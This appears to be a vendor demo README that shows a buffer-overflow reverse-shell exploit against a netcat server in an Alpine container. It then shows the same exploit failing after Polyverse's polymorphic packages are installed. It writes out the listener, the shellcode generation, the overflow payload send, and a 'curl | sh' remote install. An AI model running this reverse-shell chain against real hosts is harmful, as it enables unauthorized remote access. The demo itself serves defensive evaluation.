# Demonstration: Polyverse Polymorphic Linux
## Set up for a Reverse Shell
### (1) Start nc listening on port 5555 (Session-1)
    nc -kl 5555
## Run a simple nc echo server under Readhook
### (2) Start with a clean alpine:3.7 (Session-2)
    docker run --rm -it -p 8080:8080 alpine:3.7 sh
### (2) We'll need curl and wget
    apk update && apk add curl wget ca-certificates && update-ca-certificates
### (2) Get readhook components
    wget -q -O /tmp/basehook.so https://github.com/polyverse/readhook/releases/download/v1.1.1/basehook.so
    wget -q -O /tmp/fullhook.so https://github.com/polyverse/readhook/releases/download/v1.1.1/fullhook.so
### (2) Start nc with readhook in front of libc
    LD_PRELOAD="/tmp/fullhook.so /tmp/basehook.so" nc -l -p 8080 -e /bin/cat
## Generate Shell-Code and Perform Exploit
### (3) Generate shell-code for the exploit (Session-3)
    export shellCode=$(echo "xyzzxMAKELOADdocker.for.mac.localhost" | nc localhost 8080)
### (2) Re-start nc with minimal readhook in front of libc
    LD_PRELOAD=/tmp/basehook.so nc -l -p 8080 -e /bin/cat
### (3) Send shell-code to the OVERFLOW for a reverse shell
    echo $shellCode | nc localhost 8080
### (1) Check that the overflow resulted in a remote shell
    ls && whoami && exit
## Install Polyverse Polymorphic Linux
### (2) Add Polyverse as the preferred repository
    curl https://repo.polyverse.io/install.sh | sh -s vZ2v3Bo4Kbnwj9pECrLsoGDDo
### (2) Replace standard packages with Polymorphic Linux
    sed -n -i '/repo.polyverse.io/p' /etc/apk/repositories && apk upgrade --update-cache --available
## Test Polyverse Polymorphic Linux
### (2) Re-start nc with minimal readhook
    LD_PRELOAD=/tmp/basehook.so nc -l -p 8080 -e /bin/cat
### (3) Try the shellCode with Polymorphic Linux
    echo $shellCode | nc localhost 8080
### (1) Confirm that nobody phoned-home to the listener
### (2) Confirm that the server terminated abnormally (e.g. Segmentation fault)
